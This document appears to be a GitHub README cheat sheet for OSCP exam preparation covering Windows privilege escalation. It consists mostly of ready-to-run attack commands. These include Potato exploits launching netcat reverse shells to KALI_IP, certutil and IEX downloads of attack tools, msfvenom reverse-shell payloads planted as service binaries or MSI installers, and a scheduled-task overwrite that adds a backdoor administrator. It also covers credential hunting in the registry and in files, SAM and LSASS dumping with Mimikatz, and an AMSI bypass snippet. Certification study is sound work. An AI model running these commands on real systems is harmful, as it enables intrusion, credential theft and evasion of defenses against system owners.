<div align="center">

# 🪟 Windows Privilege Escalation

![Windows](https://img.shields.io/badge/OS-Windows-0078d4?style=for-the-badge&logo=windows)
![OSCP](https://img.shields.io/badge/OSCP-Must_Know-E94560?style=for-the-badge)

> **`whoami /priv` and `winPEAS` are your two best friends.**

</div>

---

## 📋 Quick Checklist

```
[ ] whoami /all                             ← privileges + groups
[ ] systeminfo                              ← OS version + patches
[ ] wmic qfe list                           ← what's patched?
[ ] Run winPEAS
[ ] Check services with weak permissions
[ ] Check unquoted service paths
[ ] Check scheduled tasks
[ ] Hunt credentials in registry
[ ] Hunt credentials in files
[ ] Check AlwaysInstallElevated
[ ] Check SeImpersonatePrivilege           ← Potato exploits!
```

---

## 1️⃣ Dangerous Privileges

```powershell
whoami /priv
```

### 🥔 SeImpersonatePrivilege → Potato Attacks

> **This is the most common Windows PrivEsc in OSCP boxes**

```powershell
# Check
whoami /priv | findstr "Impersonate"

# PrintSpoofer (Windows 10 / Server 2019)
certutil -urlcache -f http://KALI_IP/PrintSpoofer64.exe C:\Temp\ps.exe
C:\Temp\ps.exe -i -c cmd        # interactive cmd as SYSTEM
C:\Temp\ps.exe -c "nc.exe KALI_IP 4444 -e cmd"   # reverse shell

# GodPotato (works on almost all Windows versions)
certutil -urlcache -f http://KALI_IP/GodPotato.exe C:\Temp\gp.exe
C:\Temp\gp.exe -cmd "nc -e cmd KALI_IP 4444"

# JuicyPotato (Server 2016 / older)
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
```

### 📋 Other Dangerous Privileges

| Privilege | Exploitation Method |
|-----------|-------------------|
| `SeImpersonatePrivilege` | PrintSpoofer / GodPotato / JuicyPotato |
| `SeAssignPrimaryTokenPrivilege` | Potato attacks |
| `SeBackupPrivilege` | Read any file → dump SAM |
| `SeDebugPrivilege` | Mimikatz → dump LSASS |
| `SeTakeOwnershipPrivilege` | Take ownership of any file |
| `SeLoadDriverPrivilege` | Load malicious driver → SYSTEM |

---

## 2️⃣ Service Binary Hijacking

```powershell
# Find running services and their binary paths
Get-WmiObject win32_service | Select Name,State,PathName | Where-Object {$_.State -eq "Running"}
wmic service get name,pathname,startmode | findstr /i "auto"

# Check permissions on service binary
icacls "C:\path\to\service.exe"
# VULNERABLE if you see: Everyone:(F) or BUILTIN\Users:(W)

# Also use PowerUp:
powershell -ep bypass -c "IEX(iwr http://KALI_IP/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks"
```

```powershell
# EXPLOITATION:
# 1. Generate payload on Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o service.exe

# 2. Replace the binary
certutil -urlcache -f http://KALI_IP/service.exe "C:\path\to\service.exe"

# 3. Start listener on Kali
nc -lvnp 4444

# 4. Restart the service
sc.exe stop SERVICENAME
sc.exe start SERVICENAME
# → SYSTEM shell
```

---

## 3️⃣ Unquoted Service Paths

> **If a service path has spaces and no quotes, Windows searches intermediate paths**

```powershell
# Find unquoted paths
wmic service get name,pathname | findstr /i "auto" | findstr /iv "\"" | findstr /iv "C:\Windows"

# Example vulnerable path:
# C:\Program Files\Vulnerable Service\bin\service.exe
#
# Windows searches in order:
# 1. C:\Program.exe                           ← if writable = instant SYSTEM
# 2. C:\Program Files\Vulnerable.exe          ← if writable = instant SYSTEM
# 3. C:\Program Files\Vulnerable Service\bin\service.exe

# Check which directory is writable
icacls "C:\Program Files\Vulnerable Service"

# Plant payload at writable location
certutil -urlcache -f http://KALI_IP/shell.exe "C:\Program Files\Vulnerable.exe"

# Restart service → SYSTEM
sc.exe stop UnquotedSvc && sc.exe start UnquotedSvc
```

---

## 4️⃣ Scheduled Tasks

```powershell
# List all scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

# PowerShell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -match "SYSTEM"} | Select TaskName,TaskPath

# Find tasks with writable script paths
# e.g.: Task runs C:\Scripts\backup.bat as SYSTEM
# Check permissions:
icacls C:\Scripts\backup.bat
# If writable — overwrite with payload!
echo "net user hacker P@ss123 /add" > C:\Scripts\backup.bat
echo "net localgroup administrators hacker /add" >> C:\Scripts\backup.bat
# Wait for task to run...
```

---

## 5️⃣ Registry Credential Hunting

```powershell
# AutoLogon credentials (gold mine)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# VNC passwords
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# General password search
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# AlwaysInstallElevated (run MSI as SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### AlwaysInstallElevated Exploit

```bash
# If both keys = 0x1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f msi -o shell.msi

# On target:
certutil -urlcache -f http://KALI_IP/shell.msi C:\Temp\shell.msi
msiexec /quiet /qn /i C:\Temp\shell.msi
# → SYSTEM shell
```

---

## 6️⃣ Credential File Hunting

```powershell
# Common credential locations
type "C:\Windows\Panther\unattend.xml"
type "C:\Windows\Panther\Unattended.xml"
type "C:\Windows\system32\sysprep.inf"
type "C:\inetpub\wwwroot\web.config"
type "C:\xampp\htdocs\config.php"

# PowerShell history (often has creds!)
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# Search for password strings
findstr /si password *.txt *.xml *.ini *.config C:\
dir /s /b C:\ | findstr /si "pass*.txt pass*.xml cred*"
```

---

## 7️⃣ SAM Database Dump

```powershell
# If SeBackupPrivilege or as Administrator
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Transfer to Kali and extract hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Or use Mimikatz (needs SeDebugPrivilege)
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

# Crack with hashcat (mode 1000 = NTLM)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 🤖 Automated Tools

```powershell
# winPEAS (best all-around)
certutil -urlcache -f http://KALI_IP/winPEASx64.exe C:\Temp\wp.exe
C:\Temp\wp.exe

# PowerUp (PowerShell)
powershell -ep bypass
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerUp.ps1')
Invoke-AllChecks

# Seatbelt (C# enumeration)
certutil -urlcache -f http://KALI_IP/Seatbelt.exe C:\Temp\sb.exe
C:\Temp\sb.exe -group=all
```

---

## 🛡️ AMSI Bypass (Before Loading PowerShell Tools)

```powershell
# Paste this in PowerShell BEFORE loading PowerUp, etc.
$a=[Ref].Assembly.GetTypes()
foreach($b in $a){
  if($b.Name -like "*iUtils"){
    $c=$b.GetFields("NonPublic,Static")
    foreach($d in $c){
      if($d.Name -like "*Context"){
        $e=$d.GetValue($null)
        $e.m_amsiContext=0
      }
    }
  }
}
```

---

<div align="center">
<sub>Part of <a href="https://github.com/MayanSuthar">NullyBlissful OSCP Prep Series</a> · <a href="https://medium.com/@mayan230848">Read writeups on Medium</a></sub>
</div>
